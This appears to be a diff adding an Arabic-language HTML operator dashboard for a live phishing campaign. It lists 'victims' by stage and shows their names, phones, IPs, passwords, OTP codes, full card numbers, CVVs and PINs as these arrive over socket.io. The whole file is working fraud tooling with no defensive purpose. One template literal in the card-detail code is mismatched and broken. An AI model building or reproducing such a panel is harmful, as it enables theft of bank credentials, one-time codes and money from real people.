@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>لوحة التحكم - Real-Time Phishing Dashboard</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    
+    :root {
+      --bg-dark: #0a0e1a;
+      --bg-card: #131929;
+      --bg-card-hover: #1a2236;
+      --accent-green: #00d4aa;
+      --accent-red: #ff4757;
+      --accent-yellow: #ffc107;
+      --accent-blue: #3742fa;
+      --text-primary: #ffffff;
+      --text-secondary: #8892b0;
+      --border-color: #1e2a3a;
+    }
+    
+    body {
+      font-family: 'Cairo', sans-serif;
+      background: var(--bg-dark);
+      color: var(--text-primary);
+      min-height: 100vh;
+    }
+    
+    /* ─── Header ─── */
+    .header {
+      background: linear-gradient(135deg, #1a1f35 0%, #131929 100%);
+      padding: 20px 30px;
+      border-bottom: 1px solid var(--border-color);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      backdrop-filter: blur(10px);
+    }
+    
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    
+    .logo i {
+      font-size: 28px;
+      color: var(--accent-green);
+    }
+    
+    .logo h1 {
+      font-size: 22px;
+      font-weight: 800;
+      background: linear-gradient(90deg, var(--accent-green), #00b894);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+    
+    .status-indicator {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 16px;
+      background: rgba(0, 212, 170, 0.1);
+      border: 1px solid var(--accent-green);
+      border-radius: 20px;
+    }
+    
+    .status-indicator .dot {
+      width: 10px;
+      height: 10px;
+      background: var(--accent-green);
+      border-radius: 50%;
+      animation: pulse 2s infinite;
+    }
+    
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.5; transform: scale(0.8); }
+    }
+    
+    /* ─── Stats Grid ─── */
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 20px;
+      padding: 25px 30px;
+    }
+    
+    .stat-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border-color);
+      border-radius: 16px;
+      padding: 22px;
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .stat-card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      right: 0;
+      width: 4px;
+      height: 100%;
+    }
+    
+    .stat-card.green::before { background: var(--accent-green); }
+    .stat-card.blue::before { background: var(--accent-blue); }
+    .stat-card.yellow::before { background: var(--accent-yellow); }
+    .stat-card.red::before { background: var(--accent-red); }
+    
+    .stat-card:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+    }
+    
+    .stat-card .icon {
+      width: 50px;
+      height: 50px;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 22px;
+      margin-bottom: 15px;
+    }
+    
+    .stat-card.green .icon { background: rgba(0, 212, 170, 0.15); color: var(--accent-green); }
+    .stat-card.blue .icon { background: rgba(55, 66, 250, 0.15); color: var(--accent-blue); }
+    .stat-card.yellow .icon { background: rgba(255, 193, 7, 0.15); color: var(--accent-yellow); }
+    .stat-card.red .icon { background: rgba(255, 71, 87, 0.15); color: var(--accent-red); }
+    
+    .stat-card h3 { font-size: 32px; font-weight: 800; margin-bottom: 5px; }
+    .stat-card p { color: var(--text-secondary); font-size: 14px; }
+    
+    /* ─── Main Content ─── */
+    .main-content {
+      display: grid;
+      grid-template-columns: 1fr 380px;
+      gap: 25px;
+      padding: 0 30px 30px;
+    }
+    
+    @media (max-width: 1200px) {
+      .main-content { grid-template-columns: 1fr; }
+    }
+    
+    /* ─── Victims Table ─── */
+    .victims-section {
+      background: var(--bg-card);
+      border: 1px solid var(--border-color);
+      border-radius: 16px;
+      overflow: hidden;
+    }
+    
+    .section-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px 25px;
+      border-bottom: 1px solid var(--border-color);
+    }
+    
+    .section-header h2 {
+      font-size: 18px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    
+    .section-header h2 i { color: var(--accent-green); }
+    
+    .refresh-btn {
+      background: rgba(0, 212, 170, 0.1);
+      border: 1px solid var(--accent-green);
+      color: var(--accent-green);
+      padding: 8px 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-family: inherit;
+      font-size: 14px;
+      transition: all 0.3s;
+    }
+    
+    .refresh-btn:hover {
+      background: var(--accent-green);
+      color: var(--bg-dark);
+    }
+    
+    .table-container { overflow-x: auto; }
+    
+    table {
+      width: 100%;
+      border-collapse: collapse;
+    }
+    
+    th, td {
+      padding: 15px 20px;
+      text-align: right;
+      border-bottom: 1px solid var(--border-color);
+    }
+    
+    th {
+      background: rgba(0, 0, 0, 0.2);
+      font-weight: 600;
+      font-size: 13px;
+      color: var(--text-secondary);
+      text-transform: uppercase;
+    }
+    
+    tr:hover { background: var(--bg-card-hover); }
+    
+    td { font-size: 14px; }
+    
+    .stage-badge {
+      display: inline-block;
+      padding: 5px 12px;
+      border-radius: 15px;
+      font-size: 12px;
+      font-weight: 600;
+    }
+    
+    .stage-badge.registration { background: rgba(55, 66, 250, 0.2); color: #5a65fd; }
+    .stage-badge.login { background: rgba(255, 193, 7, 0.2); color: var(--accent-yellow); }
+    .stage-badge.otp { background: rgba(0, 212, 170, 0.2); color: var(--accent-green); }
+    .stage-badge.activation { background: rgba(156, 39, 176, 0.2); color: #9c27b0; }
+    .stage-badge.payment { background: rgba(255, 71, 87, 0.2); color: var(--accent-red); }
+    .stage-badge.pin { background: rgba(255, 152, 0, 0.2); color: #ff9800; }
+    
+    .time-ago {
+      font-size: 12px;
+      color: var(--text-secondary);
+    }
+    
+    /* ─── Live Feed ─── */
+    .live-feed {
+      background: var(--bg-card);
+      border: 1px solid var(--border-color);
+      border-radius: 16px;
+      display: flex;
+      flex-direction: column;
+      max-height: 600px;
+    }
+    
+    .live-feed .section-header h2 i { color: var(--accent-red); }
+    
+    .feed-container {
+      flex: 1;
+      overflow-y: auto;
+      padding: 15px;
+    }
+    
+    .feed-item {
+      background: var(--bg-card-hover);
+      border-radius: 12px;
+      padding: 15px;
+      margin-bottom: 12px;
+      border-right: 3px solid var(--accent-green);
+      animation: slideIn 0.4s ease;
+      position: relative;
+    }
+    
+    @keyframes slideIn {
+      from { opacity: 0; transform: translateX(20px); }
+      to { opacity: 1; transform: translateX(0); }
+    }
+    
+    .feed-item .stage-tag {
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      font-size: 11px;
+      padding: 3px 10px;
+      border-radius: 10px;
+      font-weight: 600;
+    }
+    
+    .feed-item .time {
+      font-size: 11px;
+      color: var(--text-secondary);
+      margin-top: 8px;
+    }
+    
+    .feed-item .data-row {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 8px;
+      font-size: 13px;
+    }
+    
+    .feed-item .data-row span:first-child { color: var(--text-secondary); }
+    .feed-item .data-row span:last-child { font-weight: 600; }
+    
+    .no-data {
+      text-align: center;
+      padding: 40px;
+      color: var(--text-secondary);
+    }
+    
+    .no-data i {
+      font-size: 40px;
+      margin-bottom: 15px;
+      opacity: 0.3;
+    }
+    
+    /* ─── Detail Modal ─── */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.8);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+      backdrop-filter: blur(5px);
+    }
+    
+    .modal-overlay.active { display: flex; }
+    
+    .modal {
+      background: var(--bg-card);
+      border-radius: 20px;
+      width: 90%;
+      max-width: 550px;
+      max-height: 90vh;
+      overflow-y: auto;
+      border: 1px solid var(--border-color);
+    }
+    
+    .modal-header {
+      padding: 20px 25px;
+      border-bottom: 1px solid var(--border-color);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    
+    .modal-header h3 {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    
+    .modal-header h3 i { color: var(--accent-green); }
+    
+    .modal-close {
+      background: none;
+      border: none;
+      color: var(--text-secondary);
+      font-size: 24px;
+      cursor: pointer;
+      transition: color 0.3s;
+    }
+    
+    .modal-close:hover { color: var(--accent-red); }
+    
+    .modal-body { padding: 25px; }
+    
+    .data-group {
+      margin-bottom: 20px;
+    }
+    
+    .data-group h4 {
+      font-size: 14px;
+      color: var(--text-secondary);
+      margin-bottom: 10px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    
+    .data-group h4 i { color: var(--accent-green); }
+    
+    .data-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+    }
+    
+    .data-item {
+      background: var(--bg-card-hover);
+      padding: 12px 15px;
+      border-radius: 10px;
+    }
+    
+    .data-item label {
+      font-size: 12px;
+      color: var(--text-secondary);
+      display: block;
+      margin-bottom: 5px;
+    }
+    
+    .data-item span {
+      font-size: 14px;
+      font-weight: 600;
+      word-break: break-all;
+    }
+    
+    .card-preview {
+      background: linear-gradient(135deg, #1a1f35, #2d3748);
+      border-radius: 16px;
+      padding: 25px;
+      margin-top: 20px;
+    }
+    
+    .card-preview .card-number {
+      font-size: 22px;
+      letter-spacing: 3px;
+      font-family: monospace;
+      margin-bottom: 15px;
+    }
+    
+    .card-preview .card-row {
+      display: flex;
+      justify-content: space-between;
+    }
+    
+    .card-preview .card-label { font-size: 11px; color: var(--text-secondary); }
+    .card-preview .card-value { font-size: 14px; font-weight: 600; }
+    
+    /* ─── Toast Notification ─── */
+    .toast {
+      position: fixed;
+      bottom: 30px;
+      left: 30px;
+      background: var(--bg-card);
+      border: 1px solid var(--accent-green);
+      border-radius: 12px;
+      padding: 15px 20px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+      z-index: 2000;
+      transform: translateY(100px);
+      opacity: 0;
+      transition: all 0.4s ease;
+    }
+    
+    .toast.show {
+      transform: translateY(0);
+      opacity: 1;
+    }
+    
+    .toast i { color: var(--accent-green); font-size: 20px; }
+    .toast .text h4 { font-size: 14px; }
+    .toast .text p { font-size: 12px; color: var(--text-secondary); }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <header class="header">
+    <div class="logo">
+      <i class="fas fa-shield-alt"></i>
+      <h1>لوحة التحكم الذكية</h1>
+    </div>
+    <div class="status-indicator">
+      <div class="dot"></div>
+      <span>الاتصال نشط</span>
+    </div>
+  </header>
+
+  <!-- Stats -->
+  <div class="stats-grid">
+    <div class="stat-card green">
+      <div class="icon"><i class="fas fa-users"></i></div>
+      <h3 id="totalVictims">0</h3>
+      <p>إجمالي الضحايا</p>
+    </div>
+    <div class="stat-card blue">
+      <div class="icon"><i class="fas fa-credit-card"></i></div>
+      <h3 id="totalPayments">0</h3>
+      <p>بيانات بطاقات مستلمة</p>
+    </div>
+    <div class="stat-card yellow">
+      <div class="icon"><i class="fas fa-key"></i></div>
+      <h3 id="totalPins">0</h3>
+      <p>أرقام سرية مستلمة</p>
+    </div>
+    <div class="stat-card red">
+      <div class="icon"><i class="fas fa-clock"></i></div>
+      <h3 id="todayVictims">0</h3>
+      <p>اليوم</p>
+    </div>
+  </div>
+
+  <!-- Main Content -->
+  <div class="main-content">
+    <!-- Victims Table -->
+    <div class="victims-section">
+      <div class="section-header">
+        <h2><i class="fas fa-list"></i> قائمة الضحايا</h2>
+        <button class="refresh-btn" onclick="loadVictims()">
+          <i class="fas fa-sync-alt"></i> تحديث
+        </button>
+      </div>
+      <div class="table-container">
+        <table>
+          <thead>
+            <tr>
+              <th>#</th>
+              <th>الاسم</th>
+              <th>الهاتف</th>
+              <th>الحالة</th>
+              <th>آخر تحديث</th>
+              <th>عرض</th>
+            </tr>
+          </thead>
+          <tbody id="victimsTable">
+            <tr><td colspan="6" class="no-data"><i class="fas fa-inbox"></i><br>لا توجد بيانات</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- Live Feed -->
+    <div class="live-feed">
+      <div class="section-header">
+        <h2><i class="fas fa-broadcast-tower"></i> البث المباشر</h2>
+      </div>
+      <div class="feed-container" id="liveFeed">
+        <div class="no-data">
+          <i class="fas fa-satellite-dish"></i>
+          <p>في انتظار البيانات...</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Detail Modal -->
+  <div class="modal-overlay" id="modal">
+    <div class="modal">
+      <div class="modal-header">
+        <h3><i class="fas fa-user"></i> تفاصيل الضحية</h3>
+        <button class="modal-close" onclick="closeModal()">&times;</button>
+      </div>
+      <div class="modal-body" id="modalBody"></div>
+    </div>
+  </div>
+
+  <!-- Toast -->
+  <div class="toast" id="toast">
+    <i class="fas fa-bell"></i>
+    <div class="text">
+      <h4>إشعار جديد</h4>
+      <p id="toastText">تم استلام بيانات جديدة</p>
+    </div>
+  </div>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.min.js"></script>
+  <script>
+    const socket = io();
+    let victims = [];
+    
+    // ─── الاتصال ───
+    socket.on('connect', () => {
+      console.log('✅ متصل بالخادم');
+      socket.emit('ready');
+    });
+    
+    socket.on('all_victims', (data) => {
+      victims = data;
+      renderVictims();
+      updateStats();
+    });
+    
+    socket.on('update', (packet) => {
+      const { type, data } = packet;
+      
+      if (type === 'new_victim') {
+        victims.unshift(data);
+        showToast('ضحية جديد', data.fullName);
+        addToLiveFeed(data);
+      } else if (type === 'victim_update') {
+        const idx = victims.findIndex(v => v.requestId === data.requestId);
+        if (idx !== -1) victims[idx] = { ...victims[idx], ...data };
+        else victims.unshift(data);
+        addToLiveFeed(data);
+      }
+      
+      renderVictims();
+      updateStats();
+    });
+    
+    // ─── عرض الضحايا ───
+    function renderVictims() {
+      const tbody = document.getElementById('victimsTable');
+      if (!victims.length) {
+        tbody.innerHTML = '<tr><td colspan="6" class="no-data"><i class="fas fa-inbox"></i><br>لا توجد بيانات</td></tr>';
+        return;
+      }
+      
+      tbody.innerHTML = victims.map((v, i) => `
+        <tr>
+          <td>${i + 1}</td>
+          <td>${v.fullName || '—'}</td>
+          <td>${v.phone || '—'}</td>
+          <td><span class="stage-badge ${v.stage || 'registration'}">${getStageName(v.stage)}</span></td>
+          <td><span class="time-ago">${timeAgo(v.updatedAt || v.createdAt)}</span></td>
+          <td><button onclick="showDetail(${v.requestId})" style="background:none;border:none;color:var(--accent-green);cursor:pointer;"><i class="fas fa-eye"></i></button></td>
+        </tr>
+      `).join('');
+    }
+    
+    function getStageName(stage) {
+      const names = {
+        registration: 'تسجيل',
+        login: 'دخول',
+        otp: 'تحقق',
+        activation: 'تفعيل',
+        payment: 'دفع',
+        pin: 'PIN'
+      };
+      return names[stage] || stage;
+    }
+    
+    function timeAgo(date) {
+      if (!date) return '';
+      const diff = Date.now() - new Date(date).getTime();
+      const mins = Math.floor(diff / 60000);
+      if (mins < 1) return 'الآن';
+      if (mins < 60) return `منذ ${mins} دقيقة`;
+      const hrs = Math.floor(mins / 60);
+      if (hrs < 24) return `منذ ${hrs} ساعة`;
+      return `منذ ${Math.floor(hrs / 24)} يوم`;
+    }
+    
+    // ─── الإحصائيات ───
+    function updateStats() {
+      const today = new Date().toDateString();
+      document.getElementById('totalVictims').textContent = victims.length;
+      document.getElementById('totalPayments').textContent = victims.filter(v => v.cardNumber).length;
+      document.getElementById('totalPins').textContent = victims.filter(v => v.cardPin).length;
+      document.getElementById('todayVictims').textContent = victims.filter(v => {
+        const d = new Date(v.createdAt).toDateString();
+        return d === today;
+      }).length;
+    }
+    
+    // ─── البث المباشر ───
+    function addToLiveFeed(data) {
+      const container = document.getElementById('liveFeed');
+      const noData = container.querySelector('.no-data');
+      if (noData) noData.remove();
+      
+      const stageColors = {
+        registration: '#5a65fd',
+        login: '#ffc107',
+        otp: '#00d4aa',
+        activation: '#9c27b0',
+        payment: '#ff4757',
+        pin: '#ff9800'
+      };
+      
+      const html = `
+        <div class="feed-item" style="border-right-color: ${stageColors[data.stage] || '#00d4aa'}">
+          <span class="stage-tag" style="background: ${stageColors[data.stage]}22; color: ${stageColors[data.stage]}">${getStageName(data.stage)}</span>
+          ${data.fullName ? `<div class="data-row"><span>الاسم</span><span>${data.fullName}</span></div>` : ''}
+          ${data.phone ? `<div class="data-row"><span>الهاتف</span><span>${data.phone}</span></div>` : ''}
+          ${data.username ? `<div class="data-row"><span>المستخدم</span><span>${data.username}</span></div>` : ''}
+          ${data.otpCode ? `<div class="data-row"><span>OTP</span><span>${data.otpCode}</span></div>` : ''}
+          ${data.cardNumber ? `<div class="data-row"><span>البطاقة</span><span>•••• ${data.cardLast4 || data.cardNumber.slice(-4)}</span></div>` : ''}
+          ${data.cardPin ? `<div class="data-row"><span>PIN</span><span>${data.cardPin}</span></div>` : ''}
+          <div class="time">${new Date(data.updatedAt || data.createdAt).toLocaleString('ar-EG')}</div>
+        </div>
+      `;
+      
+      container.insertAdjacentHTML('afterbegin', html);
+      
+      // حذف القديمة
+      const items = container.querySelectorAll('.feed-item');
+      if (items.length > 50) items[items.length - 1].remove();
+    }
+    
+    // ─── التفاصيل ───
+    function showDetail(requestId) {
+      const victim = victims.find(v => v.requestId === requestId);
+      if (!victim) return;
+      
+      let html = '<div class="data-group"><h4><i class="fas fa-user"></i> البيانات الأساسية</h4><div class="data-grid">';
+      if (victim.fullName) html += `<div class="data-item"><label>الاسم</label><span>${victim.fullName}</span></div>`;
+      if (victim.phone) html += `<div class="data-item"><label>الهاتف</label><span>${victim.phone}</span></div>`;
+      if (victim.address) html += `<div class="data-item"><label>العنوان</label><span>${victim.address}</span></div>`;
+      if (victim.ip) html += `<div class="data-item"><label>IP</label><span>${victim.ip}</span></div>`;
+      html += '</div></div>';
+      
+      if (victim.username || victim.password) {
+        html += '<div class="data-group"><h4><i class="fas fa-key"></i> بيانات الدخول</h4><div class="data-grid">';
+        if (victim.username) html += `<div class="data-item"><label>المستخدم</label><span>${victim.username}</span></div>`;
+        if (victim.password) html += `<div class="data-item"><label>كلمة المرور</label><span>${victim.password}</span></div>`;
+        html += '</div></div>';
+      }
+      
+      if (victim.otpCode) {
+        html += '<div class="data-group"><h4><i class="fas fa-mobile-alt"></i> رموز التحقق</h4><div class="data-grid">';
+        html += `<div class="data-item"><label>رمز OTP</label><span>${victim.otpCode}</span></div>`;
+        html += '</div></div>';
+      }
+      
+      if (victim.cardNumber) {
+        html += `
+          <div class="card-preview">
+            <div class="card-number">${victim.cardNumber}</div>
+            <div class="card-row">
+              <div><div class="card-label">صاحب البطاقة</div><div class="card-value">${victim.cardHolderName || '—'}</div></div>
+              <div><div class="card-label">تاريخ الانتهاء</div><div class="card-value">${victim.expiryDate || '—'}</div></div>
+              <div><div class="card-label">CVV</div><div class="card-value">${victim.cvv || '—'}</div></div>
+            </div>
+          </div>
+          <div class="data-group" style="margin-top:20px"><h4><i class="fas fa-money-bill"></i> معلومات الدفع</h4><div class="data-grid">';
+        if (victim.cardType) html += `<div class="data-item"><label>نوع البطاقة</label><span>${victim.cardType.toUpperCase()}</span></div>`;
+        if (victim.paymentMethod) html += `<div class="data-item"><label>طريقة الدفع</label><span>${victim.paymentMethod}</span></div>`;
+        if (victim.totalPrice) html += `<div class="data-item"><label>المبلغ</label><span>${victim.totalPrice} درهم</span></div>`;
+        html += '</div></div>';
+      }
+      
+      if (victim.cardPin) {
+        html += '<div class="data-group"><h4><i class="fas fa-lock"></i> الرقم السري</h4><div class="data-grid">';
+        html += `<div class="data-item"><label>PIN</label><span style="font-size:24px;color:var(--accent-green)">${victim.cardPin}</span></div>`;
+        html += '</div></div>';
+      }
+      
+      document.getElementById('modalBody').innerHTML = html;
+      document.getElementById('modal').classList.add('active');
+    }
+    
+    function closeModal() {
+      document.getElementById('modal').classList.remove('active');
+    }
+    
+    document.getElementById('modal').addEventListener('click', (e) => {
+      if (e.target.id === 'modal') closeModal();
+    });
+    
+    // ─── Toast ───
+    function showToast(title, text) {
+      const toast = document.getElementById('toast');
+      toast.querySelector('h4').textContent = title;
+      document.getElementById('toastText').textContent = text;
+      toast.classList.add('show');
+      setTimeout(() => toast.classList.remove('show'), 4000);
+    }
+    
+    // ─── تحديث يدوي ───
+    async function loadVictims() {
+      try {
+        const res = await fetch('/victims');
+        victims = await res.json();
+        renderVictims();
+        updateStats();
+      } catch (e) {
+        console.error(e);
+      }
+    }
+    
+    // تحديث تلقائي كل 30 ثانية
+    setInterval(loadVictims, 30000);
+  </script>
+</body>
+</html>
